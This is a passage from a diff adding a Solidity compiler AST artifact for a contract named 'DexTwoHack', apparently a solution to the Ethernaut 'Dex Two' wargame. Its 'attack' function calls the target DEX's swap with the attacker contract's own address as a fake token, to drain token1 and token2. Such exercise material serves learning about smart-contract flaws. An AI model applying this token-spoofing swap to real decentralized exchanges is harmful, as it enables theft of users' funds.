+              "nodeType": "Block",
+              "src": "432:119:23",
+              "nodes": [],
+              "statements": [
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "arguments": [
+                          {
+                            "id": 4966,
+                            "name": "this",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -28,
+                            "src": "462:4:23",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_DexTwoHack_$4989",
+                              "typeString": "contract DexTwoHack"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_contract$_DexTwoHack_$4989",
+                              "typeString": "contract DexTwoHack"
+                            }
+                          ],
+                          "id": 4965,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "454:7:23",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_$",
+                            "typeString": "type(address)"
+                          },
+                          "typeName": {
+                            "id": 4964,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "454:7:23",
+                            "typeDescriptions": {}
+                          }
+                        },
+                        "id": 4967,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "nameLocations": [],
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "454:13:23",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      {
+                        "arguments": [],
+                        "expression": {
+                          "argumentTypes": [],
+                          "expression": {
+                            "id": 4968,
+                            "name": "dexTwo",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 4921,
+                            "src": "469:6:23",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_DexTwo_$4725",
+                              "typeString": "contract DexTwo"
+                            }
+                          },
+                          "id": 4969,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "memberLocation": "476:6:23",
+                          "memberName": "token1",
+                          "nodeType": "MemberAccess",
+                          "referencedDeclaration": 4540,
+                          "src": "469:13:23",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
+                            "typeString": "function () view external returns (address)"
+                          }
+                        },
+                        "id": 4970,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "functionCall",
+                        "lValueRequested": false,
+                        "nameLocations": [],
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "469:15:23",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      {
+                        "hexValue": "31",
+                        "id": 4971,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "kind": "number",
+                        "lValueRequested": false,
+                        "nodeType": "Literal",
+                        "src": "486:1:23",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_rational_1_by_1",
+                          "typeString": "int_const 1"
+                        },
+                        "value": "1"
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        {
+                          "typeIdentifier": "t_rational_1_by_1",
+                          "typeString": "int_const 1"
+                        }
+                      ],
+                      "expression": {
+                        "id": 4961,
+                        "name": "dexTwo",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 4921,
+                        "src": "442:6:23",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_DexTwo_$4725",
+                          "typeString": "contract DexTwo"
+                        }
+                      },
+                      "id": 4963,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberLocation": "449:4:23",
+                      "memberName": "swap",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 4626,
+                      "src": "442:11:23",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
+                        "typeString": "function (address,address,uint256) external"
+                      }
+                    },
+                    "id": 4972,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "nameLocations": [],
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "442:46:23",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 4973,
+                  "nodeType": "ExpressionStatement",
+                  "src": "442:46:23"
+                },
+                {
+                  "expression": {
+                    "arguments": [
+                      {
+                        "arguments": [
+                          {
+                            "id": 4979,
+                            "name": "this",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": -28,
+                            "src": "518:4:23",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_DexTwoHack_$4989",
+                              "typeString": "contract DexTwoHack"
+                            }
+                          }
+                        ],
+                        "expression": {
+                          "argumentTypes": [
+                            {
+                              "typeIdentifier": "t_contract$_DexTwoHack_$4989",
+                              "typeString": "contract DexTwoHack"
+                            }
+                          ],
+                          "id": 4978,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": true,
+                          "lValueRequested": false,
+                          "nodeType": "ElementaryTypeNameExpression",
+                          "src": "510:7:23",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_type$_t_address_$",
+                            "typeString": "type(address)"
+                          },
+                          "typeName": {
+                            "id": 4977,
+                            "name": "address",
+                            "nodeType": "ElementaryTypeName",
+                            "src": "510:7:23",
+                            "typeDescriptions": {}
+                          }
+                        },
+                        "id": 4980,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "typeConversion",
+                        "lValueRequested": false,
+                        "nameLocations": [],
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "510:13:23",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      {
+                        "arguments": [],
+                        "expression": {
+                          "argumentTypes": [],
+                          "expression": {
+                            "id": 4981,
+                            "name": "dexTwo",
+                            "nodeType": "Identifier",
+                            "overloadedDeclarations": [],
+                            "referencedDeclaration": 4921,
+                            "src": "525:6:23",
+                            "typeDescriptions": {
+                              "typeIdentifier": "t_contract$_DexTwo_$4725",
+                              "typeString": "contract DexTwo"
+                            }
+                          },
+                          "id": 4982,
+                          "isConstant": false,
+                          "isLValue": false,
+                          "isPure": false,
+                          "lValueRequested": false,
+                          "memberLocation": "532:6:23",
+                          "memberName": "token2",
+                          "nodeType": "MemberAccess",
+                          "referencedDeclaration": 4542,
+                          "src": "525:13:23",
+                          "typeDescriptions": {
+                            "typeIdentifier": "t_function_external_view$__$returns$_t_address_$",
+                            "typeString": "function () view external returns (address)"
+                          }
+                        },
+                        "id": 4983,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": false,
+                        "kind": "functionCall",
+                        "lValueRequested": false,
+                        "nameLocations": [],
+                        "names": [],
+                        "nodeType": "FunctionCall",
+                        "src": "525:15:23",
+                        "tryCall": false,
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        }
+                      },
+                      {
+                        "hexValue": "31",
+                        "id": 4984,
+                        "isConstant": false,
+                        "isLValue": false,
+                        "isPure": true,
+                        "kind": "number",
+                        "lValueRequested": false,
+                        "nodeType": "Literal",
+                        "src": "542:1:23",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_rational_1_by_1",
+                          "typeString": "int_const 1"
+                        },
+                        "value": "1"
+                      }
+                    ],
+                    "expression": {
+                      "argumentTypes": [
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        {
+                          "typeIdentifier": "t_address",
+                          "typeString": "address"
+                        },
+                        {
+                          "typeIdentifier": "t_rational_1_by_1",
+                          "typeString": "int_const 1"
+                        }
+                      ],
+                      "expression": {
+                        "id": 4974,
+                        "name": "dexTwo",
+                        "nodeType": "Identifier",
+                        "overloadedDeclarations": [],
+                        "referencedDeclaration": 4921,
+                        "src": "498:6:23",
+                        "typeDescriptions": {
+                          "typeIdentifier": "t_contract$_DexTwo_$4725",
+                          "typeString": "contract DexTwo"
+                        }
+                      },
+                      "id": 4976,
+                      "isConstant": false,
+                      "isLValue": false,
+                      "isPure": false,
+                      "lValueRequested": false,
+                      "memberLocation": "505:4:23",
+                      "memberName": "swap",
+                      "nodeType": "MemberAccess",
+                      "referencedDeclaration": 4626,
+                      "src": "498:11:23",
+                      "typeDescriptions": {
+                        "typeIdentifier": "t_function_external_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
+                        "typeString": "function (address,address,uint256) external"
+                      }
+                    },
+                    "id": 4985,
+                    "isConstant": false,
+                    "isLValue": false,
+                    "isPure": false,
+                    "kind": "functionCall",
+                    "lValueRequested": false,
+                    "nameLocations": [],
+                    "names": [],
+                    "nodeType": "FunctionCall",
+                    "src": "498:46:23",
+                    "tryCall": false,
+                    "typeDescriptions": {
+                      "typeIdentifier": "t_tuple$__$",
+                      "typeString": "tuple()"
+                    }
+                  },
+                  "id": 4986,
+                  "nodeType": "ExpressionStatement",
+                  "src": "498:46:23"
+                }
+              ]
+            },
+            "functionSelector": "9e5faafc",
+            "implemented": true,
+            "kind": "function",
+            "modifiers": [],
+            "name": "attack",
+            "nameLocation": "414:6:23",
+            "parameters": {
+              "id": 4959,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "420:2:23"
+            },
+            "returnParameters": {
+              "id": 4960,
+              "nodeType": "ParameterList",
+              "parameters": [],
+              "src": "432:0:23"
+            },
+            "scope": 4989,
+            "stateMutability": "nonpayable",
+            "virtual": false,
+            "visibility": "external"
+          }
+        ],
+        "abstract": false,
+        "baseContracts": [],
+        "canonicalName": "DexTwoHack",
+        "contractDependencies": [],
+        "contractKind": "contract",
+        "fullyImplemented": true,
+        "linearizedBaseContracts": [
+          4989
+        ],
+        "name": "DexTwoHack",
+        "nameLocation": "91:10:23",
+        "scope": 4990,
+        "usedErrors": []
+      }
+    ],
+    "license": "MIT"
+  },
+  "id": 23
+}
